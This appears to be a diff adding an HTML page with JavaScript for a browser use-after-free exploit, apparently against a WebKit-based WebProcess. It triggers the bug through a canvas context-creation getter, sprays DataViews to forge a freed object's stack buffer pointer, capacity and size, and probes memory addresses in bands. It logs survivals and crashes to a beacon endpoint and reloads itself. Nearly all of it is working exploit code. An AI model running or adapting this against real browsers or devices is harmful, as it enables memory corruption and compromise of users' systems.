@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V911</title></head>
+<body><pre id="out">V911 — pre-registered two-arm differential (cobrajet302gt laws)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V911-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * Pre-registered instrument (cobrajet302gt, issue #10 reply):
+ *   - canonical forge: m_buffer LE pair @+112, m_capacity u32 =1 @+120,
+ *     m_size u32 =1 @+124 (the all-words arm is dead: cap/size are 4-byte
+ *     cells and an every-word fill destroys them).
+ *   - two arms per candidate T in the same WebProcess when possible:
+ *       A: size=1    -> last() = State[0], read at T+0x30
+ *       B: size=64   -> read at T + 63*448 + 0x30 (~T+27.6KB)
+ *     survive/crash inside the pair = attributed mapped hit.
+ *     crash/crash = ambiguous (unmapped, or the forge never landed:
+ *     the destructor nulls m_stateStack.m_buffer, so an unreclaimed slot
+ *     reads null+0x30 regardless of T).
+ * State machine: arm A runs for T; if A survives, arm B runs in-process.
+ * If A crashes, the SAME T re-runs as arm B on the next load before the
+ * grid advances. Bands auto-chain; ?r=1 resets.
+ * Bands are UNBOUND (the old constants belong to the loader process).
+ */
+
+var hi32 = function(a){ return Math.floor(a / 4294967296); };
+var lo32 = function(a){ return a >>> 0; };
+var TARGETS = [];
+var BANDS = [
+  function(){ for (var a = 0x100000000; a < 0x400000000; a += 0x400000) TARGETS.push([hi32(a), lo32(a), '1G+' + ((a - 0x100000000) / 1048576) + 'M']); },
+  function(){ for (var a = 0x400000000; a < 0x800000000; a += 0x800000) TARGETS.push([hi32(a), lo32(a), '4G+' + ((a - 0x400000000) / 1048576) + 'M']); },
+  function(){ for (var a = 0x0FFF000000; a <= 0x1001000000; a += 0x200000) TARGETS.push([hi32(a), lo32(a), 'wp14+' + (a - 0xFFF000000) + '']); },
+  function(){ for (var a = 0x7FFFF0000000; a <= 0x7FFFFFFFE000; a += 0x40000) TARGETS.push([hi32(a), lo32(a), 'stack+' + ((a - 0x7FFFF0000000) / 65536) + 'K']); },
+  function(){ addRange(0x310000000, 0x1000000, 0x40000, 'libcHeap'); },
+  function(){ addRange(0x060388000, 0x1000000, 0x400000, 'loaderEboot'); }
+];
+function addRange(base, span, step, tag) {
+  for (var o = -span; o <= span; o += step) {
+    var a = base + o;
+    if (a <= 0) continue;
+    TARGETS.push([hi32(a), lo32(a), tag + (o >= 0 ? '+' : '-') + (Math.abs(o) / 1048576) + 'M']);
+  }
+}
+var band = 0, attempt = 0, phase = 'A';
+try {
+  var mb = location.search.match(/b=(\d)/);
+  if (mb) { localStorage.setItem('v911_band', mb[1]); localStorage.setItem('v911_attempt', '0'); localStorage.setItem('v911_phase', 'A'); }
+  if (location.search.indexOf('r=1') >= 0) { localStorage.setItem('v911_attempt', '0'); localStorage.setItem('v911_phase', 'A'); }
+  band = parseInt(localStorage.getItem('v911_band')) || 0;
+  attempt = parseInt(localStorage.getItem('v911_attempt')) || 0;
+  phase = localStorage.getItem('v911_phase') || 'A';
+} catch(e) {}
+if (band < BANDS.length) BANDS[band]();
+var MAX = TARGETS.length;
+
+function uafCycle() {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+  if (!innerCtx) return null;
+  for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+  var dvs = [];
+  for (var s = 0; s < 150; s++) {
+    var ab = new ArrayBuffer(768);
+    dvs.push(new DataView(ab));
+  }
+  return { inner: innerCtx, dvs: dvs };
+}
+
+function forge(cycle, tgtHi, tgtLo, cap, size) {
+  for (var w = 0; w < cycle.dvs.length; w++) {
+    var dv = cycle.dvs[w];
+    dv.setUint32(112, tgtLo, true);
+    dv.setUint32(116, tgtHi, true);
+    dv.setUint32(120, cap, true);
+    dv.setUint32(124, size, true);
+  }
+  var leaked = cycle.inner.lineWidth;
+  cycle.inner = null;
+  for (var c = 0; c < cycle.dvs.length; c++) {
+    cycle.dvs[c].setFloat64(112, 0, true);
+    cycle.dvs[c].setUint32(120, 0, true);
+    cycle.dvs[c].setUint32(124, 0, true);
+  }
+  return leaked;
+}
+function hex(v){var b8=new ArrayBuffer(8),fa=new Float64Array(b8),u=new Uint32Array(b8);fa[0]=v;return '0x'+('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);}
+
+bk('BOOT', 'band=' + band + ' attempt=' + attempt + '/' + MAX + ' phase=' + phase);
+if (attempt >= MAX) {
+  bk('EXHAUSTED', 'band-' + band + '-all-' + MAX);
+  if (band + 1 < BANDS.length) {
+    try { localStorage.setItem('v911_band', String(band + 1)); localStorage.setItem('v911_attempt', '0'); localStorage.setItem('v911_phase', 'A'); } catch(e) {}
+    bk('NEXTBAND', String(band + 1));
+    setTimeout(function(){ location.reload(); }, 4000);
+  }
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x' + ('00000000' + tgtHi.toString(16)).slice(-8) + ('00000000' + tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n=' + attempt + '|addr=' + tgtHex + '|' + tgtDesc + '|arm=' + phase);
+
+  var cap = (phase === 'A') ? 1 : 64;
+  var size = (phase === 'A') ? 1 : 64;
+
+  var cycle = uafCycle();
+  if (!cycle) { bk('FAIL', 'no-uaf'); try { localStorage.setItem('v911_phase', phase); } catch(e) {} }
+  else {
+    bk('SPRAY', 'n=150|tgt=' + tgtHex + '|cap=' + cap + '|size=' + size);
+    var leaked = forge(cycle, tgtHi, tgtLo, cap, size);
+    var lw = hex(leaked);
+    bk('SURV', 'arm=' + phase + '|addr=' + tgtHex + '|lw=' + leaked + '|hex=' + lw);
+    say('SURVIVED ' + tgtHex + ' arm=' + phase + ' -> ' + lw);
+
+    if (phase === 'A') {
+      /* A survived: run arm B in the same WebProcess for attribution */
+      var c2 = uafCycle();
+      if (!c2) { bk('PAIR', 'A-surv,B-nouaf|addr=' + tgtHex); }
+      else {
+        bk('SPRAY-B', 'n=150|tgt=' + tgtHex);
+        var leaked2 = forge(c2, tgtHi, tgtLo, 64, 64);
+        var lw2 = hex(leaked2);
+        bk('PAIR', 'A-surv,B-surv|addr=' + tgtHex + '|lwB=' + leaked2 + '|hexB=' + lw2 + ' => T mapped, big extent');
+      }
+      try { localStorage.setItem('v911_attempt', String(attempt + 1)); localStorage.setItem('v911_phase', 'A'); } catch(e) {}
+      bk('DONE', 'T=' + tgtHex + ' attributed-mapped');
+    } else {
+      /* phase B ran after A crashed: B surviving is anomalous (mapping hole) */
+      bk('PAIR', 'A-crash,B-surv|addr=' + tgtHex + '|lw=' + leaked + ' => mapping hole at T+27K, T+0x30 unmapped');
+      try { localStorage.setItem('v911_attempt', String(attempt + 1)); localStorage.setItem('v911_phase', 'A'); } catch(e) {}
+      bk('DONE', 'T=' + tgtHex);
+    }
+  }
+  if (phase === 'A') {
+    /* A crashed: the process is dead — arm B for the SAME T runs next load */
+    try { localStorage.setItem('v911_phase', 'B'); } catch(e) {}
+    setTimeout(function(){ location.reload(); }, 1500);
+  }
+}
+</script></body></html>
